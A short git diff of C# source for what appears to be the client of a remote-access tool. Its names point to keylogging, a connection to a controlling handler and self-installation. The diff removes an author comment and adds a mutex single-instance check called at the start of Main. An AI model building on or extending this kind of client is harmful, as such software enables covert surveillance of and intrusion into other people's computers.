@@ -2,16 +2,22 @@
 using System.Runtime.InteropServices;
 using System.Threading;
 
-/* 
-|| AUTHOR Arsium ||
-|| github : https://github.com/arsium       ||
-*/
-
 namespace Client
 {
     public class EntryClass
     {
         internal static bool KeylogOn;
+        private static Mutex MT;
+        private static bool OW = false;
+        public static void OneInstance()
+        {
+            MT = new Mutex(true, Config.mutex, out OW);
+            if (!OW)
+            {
+                Environment.Exit(0);
+            }
+        }
+
         static EntryClass()
         {
             KeylogOn = false;
@@ -35,6 +41,7 @@ namespace Client
 
         public static void Main()
         {
+            OneInstance();
             clientHandler.ConnectStart();
             MakeInstall();
             new Thread(new ThreadStart(() => {
